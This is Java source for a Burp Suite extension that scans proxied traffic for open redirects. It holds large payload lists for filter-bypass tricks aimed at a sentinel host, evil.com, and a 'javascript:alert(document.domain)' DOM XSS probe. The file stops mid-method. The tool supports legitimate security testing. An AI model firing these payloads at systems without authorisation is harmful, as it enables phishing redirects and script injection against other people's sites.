import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.Annotations;
import burp.api.montoya.core.ToolType;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.handler.HttpHandler;
import burp.api.montoya.http.handler.HttpRequestToBeSent;
import burp.api.montoya.http.handler.HttpResponseReceived;
import burp.api.montoya.http.handler.RequestToBeSentAction;
import burp.api.montoya.http.handler.ResponseReceivedAction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.proxy.ProxyHistoryFilter;
import burp.api.montoya.proxy.ProxyHttpRequestResponse;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.editor.EditorOptions;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.event.MouseInputAdapter;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.TableRowSorter;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.FileWriter;
import java.net.URI;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Pattern;

/**
 * Open Redirect Hunter - v2.0
 * -----------------------------------------------------------------------
 * Java / Montoya API Burp Suite extension. Passively monitors in-scope
 * Proxy traffic and actively tests candidate parameters (one at a time)
 * for Open Redirect using a sentinel attacker-controlled host.
 *
 * UI architecture (mirrors the reference "XSS Sentinel" Swing tab layout):
 *   Config              - runtime settings / global state
 *   ResultRow / Model    - Swing table model backing the results table
 *   Logger               - timestamped logging to stdout + UI log pane
 *   ExtensionUI          - the "Open Redirect Hunter" suite tab (settings + table + log)
 *   Worker pool          - background thread pool that fires payloads and
 *                          reports findings back onto the UI (EDT-safe)
 * -----------------------------------------------------------------------
 */
public class OpenRedirectHunterTab implements BurpExtension, HttpHandler
{
    private MontoyaApi api;
    private Config cfg;
    private ResultsTableModel model;
    private ExtensionUI ui;
    private ExecutorService pool;
    private final HeadlessVerifier headlessVerifier = new HeadlessVerifier();
    private final AtomicInteger monitored = new AtomicInteger(0);
    private final AtomicInteger findings = new AtomicInteger(0);
    private volatile boolean cancelRequested = false;
    // Host-level dedup cache for the Generic Path-Based Redirect mode — that mode tests a HOST's
    // root once, not every request, so we track which hosts have already been tested this session.
    private final java.util.Set<String> testedHostsForGenericPath = java.util.concurrent.ConcurrentHashMap.newKeySet();
    // Dedup cache: (method|path-without-query|paramName|paramType) combos already tested this
    // session, so the same param on the same endpoint isn't re-tested when it reappears (same page
    // reloaded in Live traffic, same endpoint many times in Proxy History, etc). Cleared on "Clear Results".
    private final java.util.Set<String> testedParamKeys = java.util.concurrent.ConcurrentHashMap.newKeySet();

    // Where a scan originated from — shown in results and used to decide whether the (slow)
    // DOM/headless fallback should run automatically (never for LIVE unless explicitly opted in).
    enum ScanSource
    {
        LIVE("Live Proxy"), PROXY_HISTORY("Proxy History"), SITE_MAP("Site Map"),
        MANUAL("Manual (sent from Burp)"), IMPORTED("Imported List");

        final String label;
        ScanSource(String label) { this.label = label; }
    }

    private static final String DEFAULT_SENTINEL = "evil.com";

    private static final String[] PARAM_NAME_HINTS = {
            "url", "redirect", "redirect_uri", "redirecturi", "redirect_url", "return",
            "returnurl", "return_url", "next", "dest", "destination", "continue",
            "target", "out", "view", "load", "goto", "forward", "callback", "callbackurl",
            "image_url", "img", "link", "ref", "referrer", "returnto", "return_to",
            "checkout_url", "success_url", "cancel_url", "path", "page", "site", "domain",
            "host", "window", "location"
    };

    private static final Pattern URLISH_VALUE = Pattern.compile(
            "^(https?:)?//|^/[a-zA-Z0-9]|^[a-zA-Z][a-zA-Z0-9+.\\-]*://", Pattern.CASE_INSENSITIVE);

    // {HOST} is replaced with cfg.sentinelHost (default: evil.com).
    // These 3 always run regardless of Payloads-tab category checkboxes — the baseline set.
    private static final String[] CORE_ALWAYS_ON = { "https://{HOST}/", "//{HOST}/", "///{HOST}/" };

    // All other payload variants, grouped into categories shown as toggles on the "Payloads" sub-tab.
    // Every category defaults OFF — only CORE_ALWAYS_ON runs until the user opts a category in.
    private static final java.util.LinkedHashMap<String, String[]> PAYLOAD_CATEGORIES = new java.util.LinkedHashMap<>();
    static
    {
        PAYLOAD_CATEGORIES.put("Basic Variants", new String[]{
                "http://{HOST}/", "{HOST}", "{HOST}/", "////{HOST}/", "\\/{HOST}",
                "https:/{HOST}/", "https:{HOST}/", "\\\\{HOST}/", "/\\/{HOST}/", "/\\{HOST}"
        });
        PAYLOAD_CATEGORIES.put("Userinfo / @ Tricks (generic)", new String[]{
                "https://{HOST}\\@trusted.example.com/", "https://trusted.example.com@{HOST}/",
                "https://trusted.example.com.{HOST}/", "https://{HOST}%2F@trusted.example.com/",
                "https://trusted.example.com%2f%2f{HOST}/", "https://{HOST}%09@trusted.example.com/",
                "https://{HOST}%23@trusted.example.com/", "https://{HOST}%3f@trusted.example.com/"
        });
        PAYLOAD_CATEGORIES.put("Encoding Tricks", new String[]{
                "https:%2f%2f{HOST}/", "https:/%5c{HOST}/", "https:/%09/{HOST}", "/%09/{HOST}",
                "//%2F{HOST}", "https://{HOST}%2e/", "%2f%2f{HOST}"
        });
        PAYLOAD_CATEGORIES.put("Whitespace / Null-byte / Case Tricks", new String[]{
                "  https://{HOST}/", "https://{HOST}?.trusted.example.com", "https://{HOST}#.trusted.example.com",
                "https://{HOST}%00.trusted.example.com", "@{HOST}", "https://{HOST}.", "HTTPS://{HOST}/", "https:/\\{HOST}/"
        });
        PAYLOAD_CATEGORIES.put("Filter Bypass (path/scheme tricks)", new String[]{
                "/%0d/{HOST}", "/%0A/{HOST}", "/%0D/{HOST}", "/+/{HOST}",
                "/..//{HOST}", "http:///{HOST}/", ".{HOST}", "https;{HOST}",
                "https:\\/\\/{HOST}", "https:/\\/\\{HOST}"
        });
        PAYLOAD_CATEGORIES.put("Encoding Bypass (percent-encoded)", new String[]{
                "https://%09/{HOST}", "http%3A%2F%2F{HOST}", "https%3A%2F%2F{HOST}%2F",
                "%40{HOST}/", "%2F%2F{HOST}", "%2F%2F%2F%2F{HOST}"
        });
        PAYLOAD_CATEGORIES.put("////\\ Protocol-Relative Extras", new String[]{
                "\\\\{HOST}/", "/\\/{HOST}"
        });
    }

    // Fully percent-encoded "http://" / "https://" prefixes, used only by buildEncodingBypassPayloads()
    // since they need to be concatenated directly onto an already-encoded sentinel host rather than
    // substituted via the plain {HOST} token (see that method for why).
    private static final String PCT_HTTP_PREFIX = "%68%74%74%70%3a%2f%2f";   // "http://" fully percent-encoded

    /**
     * Builds the effective payload template list for a test pass: CORE_ALWAYS_ON plus every
     * category currently switched on in the Payloads sub-tab. Used uniformly for the main loop
     * AND the DOM headless fallback — category toggles are now the single source of truth for
     * what runs, replacing the old separate "fast" vs "full" hardcoded lists.
     */
    private List<String> buildEffectivePayloadList()
    {
        List<String> list = new ArrayList<>(java.util.Arrays.asList(CORE_ALWAYS_ON));
        for (java.util.Map.Entry<String, String[]> entry : PAYLOAD_CATEGORIES.entrySet())
        {
            if (Boolean.TRUE.equals(cfg.categoryEnabled.get(entry.getKey())))
            {
                list.addAll(java.util.Arrays.asList(entry.getValue()));
            }
        }
        return list;
    }

    // =======================================================================
    // Generic Path-Based Redirect payloads — inspired by a nuclei "open-redirect-generic" template.
    // Fundamentally different from the query-param payloads above: these are PATH segments, not
    // query values, and target server/framework/reverse-proxy URL-normalization bugs directly —
    // no application-level "redirect" parameter is needed at all. Final request path is always
    // "/" + payload (matching the template's "{{RootURL}}/{{payload}}" convention), so a payload
    // that itself starts with "//" intentionally produces "///..." — several real-world findings
    // (Boeing, Worldpay) are exactly that triple-slash form.
    // =======================================================================
    private static final String[] GENERIC_PATH_PAYLOADS = {
            "%0a/{HOST}/", "%0d/{HOST}/", "%00/{HOST}/", "%09/{HOST}/",
            "%5C%5C{HOST}/%252e%252e%252f", "%5C{HOST}", "%5c{HOST}/%2f%2e%2e",
            "//#//{HOST}/", "//{HOST}/%2f%2e%2e", "//{HOST}/%2e%2e",
            "//%09/{HOST}", "//%5c{HOST}", "//{HOST}/..;/css", "//\\{HOST}",
            "//%EF%B9%B0/{HOST}", "//;@{HOST}", "../{HOST}", ".{HOST}",
            "/%5c{HOST}", "////\\;@{HOST}", "////{HOST}", "///{HOST}",
            "///{HOST}/%2f%2e%2e", "///{HOST}@//", "//\\/{HOST}/", "//\\@{HOST}",
            "//\\{HOST}/", "//{HOST}/%2F..", "//{HOST}//", "//{HOST}@//",
            "//{HOST}\t{HOST}/", "//https://{HOST}//", "/<>//{HOST}",
            "/\\/\\/{HOST}/", "/\\/{HOST}", "/\\{HOST}", "//@{HOST}", "///@{HOST}",
            "////@{HOST}/", "/{HOST}", "/{HOST}/%2F..", "/{HOST}/", "/{HOST}/..;/css",
            "/https:{HOST}", "/\u3031{HOST}", "/\u3035{HOST}", "/\u309d{HOST}",
            "/\u30fc{HOST}", "/\uff70{HOST}", "<>//{HOST}", "@{HOST}", "@https://{HOST}",
            "\\/\\/{HOST}/", "{HOST}", "{HOST}/", "{HOST}//", "{HOST};@",
            "https%3a%2f%2f{HOST}%2f", "https:%0a%0d{HOST}", "https://%0a%0d{HOST}",
            "https://%09/{HOST}", "https://%2f%2f.{HOST}/", "https://%3F.{HOST}/",
            "https://%5c%5c.{HOST}/", "https://%5c{HOST}@", "https://%23.{HOST}/",
            "https://.{HOST}", "https://////{HOST}", "https:///{HOST}",
            "https:///{HOST}/%2e%2e", "https:///{HOST}/%2f%2e%2e",
            "https:///{HOST}@{HOST}/%2e%2e", "https:///{HOST}@{HOST}/%2f%2e%2e",
            "https://:80#@{HOST}/", "https://:80?@{HOST}/", "https://:@\\@{HOST}",
            "https://:@{HOST}\\@{HOST}", "https://;@{HOST}", "https://\t{HOST}/",
            "https://{HOST}/{HOST}", "https://{HOST}/https://{HOST}/",
            "https://www.\\.{HOST}", "https:/\\/\\{HOST}", "https:/\\{HOST}",
            "https:/{HOST}", "https:{HOST}", "redirect/{HOST}",
            "cgi-bin/redirect.cgi?{HOST}", "out?{HOST}", "login?to=http://{HOST}",
            "1/_https@{HOST}", "redirect?targeturl=https://{HOST}"
    };

    private static final String[] IGNORE_EXTENSIONS = {
            ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".webp", ".ico", ".svg",
            ".woff", ".woff2", ".ttf", ".otf", ".mp4", ".mp3", ".zip", ".pdf"
    };

    // =======================================================================
    // Entry point
    // =======================================================================
    @Override
    public void initialize(MontoyaApi api)
    {
        this.api = api;
        api.extension().setName("Open Redirect Hunter");

        this.cfg = new Config();
        this.model = new ResultsTableModel();
        this.pool = Executors.newFixedThreadPool(cfg.maxThreads);

        this.ui = new ExtensionUI(api, cfg, model, this);
        api.userInterface().registerSuiteTab("Open Redirect Hunter", ui.root());

        api.http().registerHttpHandler(this);
        api.userInterface().registerContextMenuItemsProvider(new SendToScanContextMenu());

        ui.log("Open Redirect Hunter loaded. Sentinel host: " + cfg.sentinelHost);
        ui.log("Headless (Selenium) Deep Verify: " + (headlessVerifier.available()
                ? "available" : "NOT available — add selenium-java + selenium-chrome-driver jars to use it"));
        ui.log("Passive param hints: " + PARAM_NAME_HINTS.length + " | Core payloads (always on): " +
                CORE_ALWAYS_ON.length + " | Categories available: " + PAYLOAD_CATEGORIES.size() +
                " (all OFF by default — see the Payloads tab)");
    }

    // =======================================================================
    // HttpHandler - pass requests straight through, analyze on response
    // =======================================================================
    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent)
    {
        return RequestToBeSentAction.continueWith(requestToBeSent);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived)
    {
        try
        {
            if (!cfg.enabled) return ResponseReceivedAction.continueWith(responseReceived);
            if (!responseReceived.toolSource().isFromTool(ToolType.PROXY))
                return ResponseReceivedAction.continueWith(responseReceived);

            HttpRequest request = responseReceived.initiatingRequest();
            String path = request.path();
            if (hasIgnoredExtension(path)) return ResponseReceivedAction.continueWith(responseReceived);

            if (cfg.scopeOnly)
            {
                try { if (!api.scope().isInScope(request.url())) return ResponseReceivedAction.continueWith(responseReceived); }
                catch (Exception ignored) {}
            }

            String method = request.method();
            boolean isGet = "GET".equalsIgnoreCase(method);
            boolean isPost = "POST".equalsIgnoreCase(method);
            boolean methodOk = (cfg.enableGet && isGet) || (cfg.testPostBody && isPost);
            if (!methodOk) return ResponseReceivedAction.continueWith(responseReceived);

            HttpRequestResponse rr = HttpRequestResponse.httpRequestResponse(request, responseReceived);
            monitored.incrementAndGet();
            ui.refreshStats(monitored.get(), findings.get());

            pool.submit(() -> analyze(rr, ScanSource.LIVE));
        }
        catch (Exception e)
        {
            ui.log("ERROR handleHttpResponseReceived: " + e);
        }
        return ResponseReceivedAction.continueWith(responseReceived);
    }

    /**
     * Right-click "Send to Open Redirect Hunter" — available from Proxy History, Repeater,
     * Target Site Map, or anywhere else Burp shows a request/response context menu. Lets the
     * user scan a specific request on demand instead of waiting for it to be seen live or
     * running a full bulk scan.
     */
    private class SendToScanContextMenu implements ContextMenuItemsProvider
    {
        @Override
        public List<Component> provideMenuItems(ContextMenuEvent event)
        {
            List<HttpRequestResponse> selected = event.selectedRequestResponses();
            if ((selected == null || selected.isEmpty()) && event.messageEditorRequestResponse().isPresent())
            {
                selected = List.of(event.messageEditorRequestResponse().get().requestResponse());
            }
            if (selected == null || selected.isEmpty()) return List.of();

            List<HttpRequestResponse> toScan = selected;
            JMenuItem item = new JMenuItem("Send to Open Redirect Hunter (" + toScan.size() +
                    (toScan.size() == 1 ? " request)" : " requests)"));
            item.addActionListener(e -> {
                int queued = 0;
                for (HttpRequestResponse rr : toScan)
                {
                    if (rr == null || rr.request() == null) continue;
                    if (!isMethodTestable(rr.request().method())) continue; // matches Test GET/URL + POST Body settings
                    monitored.incrementAndGet();
                    queued++;
                    final HttpRequestResponse item2 = rr;
                    pool.submit(() -> analyze(item2, ScanSource.MANUAL));
                }
                ui.refreshStats(monitored.get(), findings.get());
                ui.log("Manually queued " + queued + " request(s) for scanning from context menu.");
            });
            return List.of(item);
        }
    }

    // =======================================================================
    // Bulk scan actions (triggered from the UI buttons)
    // =======================================================================
    /**
     * Deep Verify (Headless Browser) — advanced/optional confirmation step for a single
     * result row. Fires up a real headless Chrome via Selenium (loaded through reflection
     * so the extension still compiles/loads fine without Selenium on the classpath) and
     * navigates to the exact attack URL, letting the page fully render and execute JS
     * before reading the final document location. This catches SPA/client-side redirects
     * that pure static-body regex matching (findJsRedirectEvidence) can miss.
     *
     * Requires selenium-java + selenium-chrome-driver jars added to Burp's Java
     * environment classpath, and Chrome/Chromium installed locally.
     */
    /**
     * Manual "Try DOM XSS" trigger from the results table context menu — reuses the confirmed
     * request/param from an existing row (works best on a "CONFIRMED (DOM)" row, but can be tried
     * on any row) instead of requiring a fresh scan pass.
     */
    void tryDomXssFromRow(ResultRow row)
    {
        pool.submit(() -> {
            try
            {
                HttpRequest baseReq = row.evidence.request();
                HttpParameterType type = HttpParameterType.valueOf(row.type);
                String xssPayload = "javascript:alert(document.domain)";
                HttpRequest xssRequest = baseReq.withUpdatedParameters(
                        HttpParameter.parameter(row.param, xssPayload, type));

                ui.log("Try DOM XSS: navigating headless browser with javascript: payload for param=" +
                        row.param + " (manual trigger)...");
                HeadlessVerifier.DomXssResult xr = headlessVerifier.tryDomXss(xssRequest.url(), cfg.headlessTimeoutSec);

                if (!xr.seleniumAvailable)
                {
                    ui.log("Try DOM XSS unavailable — Selenium classes not on classpath.");
                    return;
                }
                if (xr.error != null)
                {
                    ui.log("Try DOM XSS error for param=" + row.param + ": " + xr.error);
                    return;
                }

                if (xr.alertFired)
                {
                    HttpRequestResponse xssEvidence;
                    try { xssEvidence = api.http().sendRequest(xssRequest); } catch (Exception e) { xssEvidence = row.original; }

                    ResultRow newRow = new ResultRow(new Date(), row.method, row.url, row.param, row.type, xssPayload,
                            "DOM XSS via redirect sink — javascript: URI executed, native alert() fired with text: \"" +
                                    xr.alertText + "\". Confirms no scheme validation on the redirect sink, only domain filtering.",
                            "CONFIRMED (DOM XSS)", row.original, xssEvidence, row.source);
                    model.addRow(newRow);
                    findings.incrementAndGet();
                    ui.refreshStats(monitored.get(), findings.get());
                    ui.log("[CONFIRMED (DOM XSS)] param=" + row.param + " -> javascript: URI executed, alert text: \"" +
                            xr.alertText + "\"");
                }
                else
                {
                    ui.log("Try DOM XSS: no alert fired for param=" + row.param +
                            " (scheme likely validated/stripped, or CSP blocked it) — final: " + xr.finalUrl);
                }
            }
            catch (Exception e)
            {
                ui.log("Try DOM XSS failed: " + e);
            }
        });
    }

    void deepVerify(ResultRow row)
    {
        pool.submit(() -> {
            row.headlessStatus = "Running...";
            model.notifyRowChanged(row);

            String targetUrl = row.evidence.request().url();
            ui.log("Deep Verify: launching headless browser for param=" + row.param + " url=" + targetUrl);

            HeadlessVerifier.Result result = headlessVerifier.verify(targetUrl, cfg.sentinelHost, cfg.headlessTimeoutSec);

            if (!result.seleniumAvailable)
            {
                row.headlessStatus = "Selenium not found";
                ui.log("Deep Verify unavailable — Selenium classes not on classpath. Add selenium-java " +
                        "and selenium-chrome-driver jars via Burp Extensions -> Java Environment, then reload.");
            }
            else if (result.error != null)
            {
                row.headlessStatus = "Error";
                ui.log("Deep Verify error: " + result.error);
            }
            else
            {
                if (result.matchedSentinel)
                {
                    String sinkText = result.sinkInfo != null ? result.sinkInfo : "sink unknown (performance log unavailable)";
                    row.headlessStatus = "CONFIRMED (host: " + hostOf(result.finalUrl) + " | raw final URL: " +
                            result.finalUrl + ") | sink: " + sinkText;
                }
                else
                {
                    row.headlessStatus = "NOT confirmed (final: " + result.finalUrl + ")";
                }
                ui.log("Deep Verify result for param=" + row.param + ": " + row.headlessStatus);
                if (result.sinkDebug != null) ui.log("Sink attribution debug: " + result.sinkDebug);
            }
            model.notifyRowChanged(row);
        });
    }

    void scanProxyHistory()
    {
        cancelRequested = false;
        pool.submit(() -> {
            List<ProxyHttpRequestResponse> history;
            try
            {
                // Use the filtered history(ProxyHistoryFilter) overload rather than history() so we
                // only touch items matching our own scope/extension rules — the closest equivalent
                // Montoya exposes to "don't scan what's hidden". Note: Burp's Proxy HTTP history UI
                // filter bar (its own text/type filters) isn't readable via the API, so this mirrors
                // scope + ignored-extensions only, not every checkbox in that filter bar.
                history = api.proxy().history(item -> {
                    try
                    {
                        HttpRequest req = item.finalRequest();
                        if (req == null || !isMethodTestable(req.method())) return false;
                        if (hasIgnoredExtension(req.path())) return false;
                        if (cfg.scopeOnly && !api.scope().isInScope(req.url())) return false;
                        return true;
                    }
                    catch (Exception e) { return false; }
                });
            }
            catch (Exception e) { ui.log("Failed to read Proxy history: " + e); return; }

            ui.log("Scanning Proxy History — " + history.size() + " matching items (scope/extension filtered)...");
            int queued = 0;
            for (ProxyHttpRequestResponse item : history)
            {
                if (cancelRequested) { ui.log("Proxy History scan cancelled after " + queued + " request(s)."); break; }
                try
                {
                    HttpRequest request = item.finalRequest();
                    HttpRequestResponse rr = HttpRequestResponse.httpRequestResponse(request, item.response());
                    monitored.incrementAndGet();
                    queued++;
                    analyze(rr, ScanSource.PROXY_HISTORY);
                }
                catch (Exception e) { ui.log("Proxy history item skipped: " + e); }
            }
            ui.refreshStats(monitored.get(), findings.get());
            if (!cancelRequested) ui.log("Proxy History scan complete — " + queued + " GET requests tested.");
        });
    }

    void scanSiteMap()
    {
        cancelRequested = false;
        pool.submit(() -> {
            List<HttpRequestResponse> items;
            try { items = api.siteMap().requestResponses(); }
            catch (Exception e) { ui.log("Failed to read Site Map: " + e); return; }

            ui.log("Scanning Site Map — " + items.size() + " items...");
            int queued = 0;
            for (HttpRequestResponse rr : items)
            {
                if (cancelRequested) { ui.log("Site Map scan cancelled after " + queued + " request(s)."); break; }
                try
                {
                    HttpRequest request = rr.request();
                    if (request == null || !isMethodTestable(request.method())) continue;
                    if (hasIgnoredExtension(request.path())) continue;
                    if (cfg.scopeOnly && !api.scope().isInScope(request.url())) continue;
                    if (rr.response() == null) continue;

                    monitored.incrementAndGet();
                    queued++;
                    analyze(rr, ScanSource.SITE_MAP);
                }
                catch (Exception e) { ui.log("Site Map item skipped: " + e); }
            }
            ui.refreshStats(monitored.get(), findings.get());
            if (!cancelRequested) ui.log("Site Map scan complete — " + queued + " GET requests tested.");
        });
    }

    void cancelScan()
    {
        cancelRequested = true;
        ui.log("Cancel requested — stopping after the current in-flight request(s) finish...");
    }

    void clearHostCache()
    {
        testedHostsForGenericPath.clear();
        testedParamKeys.clear();
    }

    void resetCounters()
    {
        monitored.set(0);
        findings.set(0);
    }

    // Path without query string — used as the dedup key base so ?page=2 vs ?page=3 of the same
    // endpoint collapse to one tested entry per (endpoint, param).
    private String pathNoQuery(HttpRequest request)
    {
        try
        {
            String p = request.path();
            if (p == null) return "/";
            int q = p.indexOf('?');
            return q >= 0 ? p.substring(0, q) : p;
        }
        catch (Exception e) { return "/"; }
    }

    /**
     * Scans a list of raw URLs supplied by the user (e.g. from waybackurls/gau, or any other
     * external source) — each is fetched live (GET) against the CURRENT server so we're testing
     * today's behavior, not just the historically-archived one, then fed through the normal
     * analyze() pipeline exactly like a live Proxy hit or a Site Map entry.
     */
    void scanImportedUrls(java.util.List<String> rawUrls)
    {
        cancelRequested = false;
        pool.submit(() -> {
            java.util.LinkedHashSet<String> deduped = new java.util.LinkedHashSet<>();
            for (String u : rawUrls)
            {
                String trimmed = u == null ? "" : u.trim();
                if (!trimmed.isEmpty()) deduped.add(trimmed);
            }

            ui.log("Importing " + deduped.size() + " unique URL(s) for scanning...");
            int queued = 0, skipped = 0;

            for (String rawUrl : deduped)
            {
                if (cancelRequested) { ui.log("Import scan cancelled after " + queued + " request(s)."); break; }
                try
                {
                    URI uri = URI.create(rawUrl);
                    String scheme = uri.getScheme();
                    if (scheme == null || uri.getHost() == null || (!"http".equalsIgnoreCase(scheme) && !"https".equalsIgnoreCase(scheme)))
                    { skipped++; continue; }
                    if (hasIgnoredExtension(uri.getRawPath())) { skipped++; continue; }
                    if (cfg.scopeOnly)
                    {
                        try { if (!api.scope().isInScope(rawUrl)) { skipped++; continue; } }
                        catch (Exception ignored) {}
                    }

                    boolean secure = "https".equalsIgnoreCase(scheme);
                    int port = uri.getPort() != -1 ? uri.getPort() : (secure ? 443 : 80);
                    HttpService service = HttpService.httpService(uri.getHost(), port, secure);
                    String path = (uri.getRawPath() == null || uri.getRawPath().isEmpty()) ? "/" : uri.getRawPath();
                    if (uri.getRawQuery() != null) path += "?" + uri.getRawQuery();
                    String raw = "GET " + path + " HTTP/1.1\r\nHost: " + service.host() + "\r\nConnection: close\r\n\r\n";

                    HttpRequest request = HttpRequest.httpRequest(service, raw);
                    HttpRequestResponse rr;
                    try { rr = api.http().sendRequest(request); } catch (Exception e) { skipped++; continue; }
                    if (rr.response() == null) { skipped++; continue; }

                    monitored.incrementAndGet();
                    queued++;
                    analyze(rr, ScanSource.IMPORTED);
                }
                catch (Exception e) { skipped++; }
            }

            ui.refreshStats(monitored.get(), findings.get());
            if (!cancelRequested)
                ui.log("Import scan complete — " + queued + " URL(s) tested, " + skipped + " skipped (invalid/out-of-scope/unreachable).");
        });
    }

    private boolean isMethodTestable(String method)
    {
        if (method == null) return false;
        return (cfg.enableGet && "GET".equalsIgnoreCase(method)) || (cfg.testPostBody && "POST".equalsIgnoreCase(method));
    }

    private boolean hasIgnoredExtension(String path)
    {
        if (path == null) return false;
        String p = path.toLowerCase(Locale.ROOT);
        int q = p.indexOf('?');
        if (q != -1) p = p.substring(0, q);
        for (String ext : IGNORE_EXTENSIONS) if (p.endsWith(ext)) return true;
        return false;
    }

    // =======================================================================
    // Core testing logic
    // =======================================================================
    private void analyze(HttpRequestResponse rr, ScanSource source)
    {
        HttpRequest request = rr.request();

        // Generic Path-Based Redirect — host-level, independent of any query parameter. Runs at
        // most once per unique host per session (see testedHostsForGenericPath).
        if (cfg.genericPathRedirectEnabled)
        {
            testGenericPathRedirectIfNewHost(request, source);
        }

        // URL/GET query-string params, and — if the "Test POST Body Params" toggle is on — POST
        // body form params too, tested through the exact same pipeline (testParam() is generic
        // over HttpParameterType, so no separate code path is needed).
        List<ParsedHttpParameter> params = new ArrayList<>(request.parameters(HttpParameterType.URL));
        if (cfg.testPostBody) params.addAll(request.parameters(HttpParameterType.BODY));

        List<ParsedHttpParameter> candidates = new ArrayList<>();
        int findingsBefore = findings.get();
        String host = "";
        try { host = request.httpService().host(); } catch (Exception ignored) {}
        String baseKey = request.method() + "|" + host + pathNoQuery(request);
        for (ParsedHttpParameter p : params)
        {
            if (!isCandidateParam(p.name(), p.value())) continue;
            candidates.add(p);

            // Dedup: skip a (endpoint, param, type) combo already tested this session (unless the
            // user turned dedup off). Big speed win on repeated endpoints; cleared on Clear Results.
            if (cfg.dedupEnabled)
            {
                String key = baseKey + "|" + p.name() + "|" + p.type();
                if (!testedParamKeys.add(key)) continue; // already tested -> skip
            }

            testParam(rr, request, p, source);

            // Speed optimization: once we have a finding for THIS URL, stop testing its other
            // params entirely (no more payloads, no more DOM headless fallback runs) rather than
            // grinding through every remaining candidate — that's where most of the slowdown after
            // an already-confirmed finding was coming from. Toggle off in settings for thoroughness.
            if (cfg.stopAfterFirstFindingPerUrl && findings.get() > findingsBefore)
            {
                return;
            }
        }

        // Multi-parameter combo pass — some redirect logic only misbehaves when TWO (or more)
        // params are attacker-controlled at once (e.g. a "redirect_uri" host bypass combined with
        // an unrelated-looking "prompt"/"state"-style param that the app also reads when building
        // the final redirect target). Individually those secondary params rarely look like redirect
        // params by name or value, so single-param testing above can miss this class of bug entirely.
        // Only runs if single-param testing above didn't already confirm something for this request
        // (saves requests) and there's more than one param total to combine.
        if (findings.get() == findingsBefore && !candidates.isEmpty() && params.size() >= 2 && !cancelRequested)
        {
            testParamCombinations(rr, request, candidates, params, source);
        }
    }

    /**
     * Tries setting multiple parameters to the sentinel payload SIMULTANEOUSLY: first all
     * identified candidates together, then each candidate paired individually with every OTHER
     * parameter in the request (even ones that don't look like redirect params on their own).
     * Capped to avoid combinatorial blow-up on requests with many parameters.
     */
    private void testParamCombinations(HttpRequestResponse original, HttpRequest baseRequest,
                                        List<ParsedHttpParameter> candidates, List<ParsedHttpParameter> allParams,
                                        ScanSource source)
    {
        String payload = CORE_ALWAYS_ON[0].replace("{HOST}", cfg.sentinelHost); // "https://evil.com/"

        if (candidates.size() >= 2)
        {
            if (tryParamCombo(original, baseRequest, candidates, payload, source)) return;
        }

        int otherTried = 0;
        for (ParsedHttpParameter candidate : candidates)
        {
            for (ParsedHttpParameter other : allParams)
            {
                if (cancelRequested && source != ScanSource.LIVE) return;
                if (otherTried >= 8) return; // cap — avoid excessive requests on wide-param URLs
                if (other.name().equals(candidate.name())) continue;
                if (candidates.stream().anyMatch(c -> c.name().equals(other.name()))) continue; // already covered above

                otherTried++;
                if (tryParamCombo(original, baseRequest, java.util.Arrays.asList(candidate, other), payload, source)) return;
            }
        }
    }

    private boolean tryParamCombo(HttpRequestResponse original, HttpRequest baseRequest,
                                   List<ParsedHttpParameter> paramsToSet, String payload, ScanSource source)
    {
        List<HttpParameter> updates = new ArrayList<>();
        for (ParsedHttpParameter p : paramsToSet) updates.add(HttpParameter.parameter(p.name(), payload, p.type()));

        HttpRequest attackRequest = baseRequest.withUpdatedParameters(updates);
        HttpRequestResponse attackResult;
        try { attackResult = api.http().sendRequest(attackRequest); } catch (Exception e) { return false; }
        HttpResponse response = attackResult.response();
        if (response == null) return false;
        rateLimit();

        String names = paramsToSet.stream().map(ParsedHttpParameter::name).collect(java.util.stream.Collectors.joining(" + "));

        String location = response.headerValue("Location");
        if (location != null && hostMatchesSentinel(location, attackRequest.url()) && isRedirectStatus(response.statusCode()))
        {
            ChainResult chain = followRedirectChain(attackRequest, location, 3);
            report(original, attackResult, baseRequest.method(), baseRequest.url(), names, "MULTI-PARAM", payload,
                    "Location: " + location + " — only bypasses when set TOGETHER (" + names + "), each alone was not exploitable" +
                            (chain.hops > 0 ? " (followed " + chain.hops + " hop(s) -> final host: " + chain.finalHost + ")" : ""),
                    "CONFIRMED (multi-param)", true, source);
            return true;
        }

        String body = response.bodyToString();
        if (body != null)
        {
            String jsEvidence = findJsRedirectEvidence(body);
            if (jsEvidence != null)
            {
                report(original, attackResult, baseRequest.method(), baseRequest.url(), names, "MULTI-PARAM", payload,
                        "Client-side redirect — only bypasses when set TOGETHER (" + names + "): " + jsEvidence,
                        "LIKELY (multi-param)", false, source);
                return true;
            }
        }
        return false;
    }

    /**
     * Generic Path-Based Redirect: tests a HOST's root ("/") once with GENERIC_PATH_PAYLOADS —
     * server/framework/reverse-proxy URL-normalization bugs, independent of any application
     * "redirect" query parameter. Deduped per host via testedHostsForGenericPath so the same
     * domain (which may appear in dozens/hundreds of Proxy/Live requests) is only tested once.
     */
    private void testGenericPathRedirectIfNewHost(HttpRequest request, ScanSource source)
    {
        HttpService service;
        try { service = request.httpService(); if (service == null || service.host() == null) return; }
        catch (Exception e) { return; }

        String host = service.host();
        if (!testedHostsForGenericPath.add(host)) return; // already tested this host this session

        if (cfg.scopeOnly)
        {
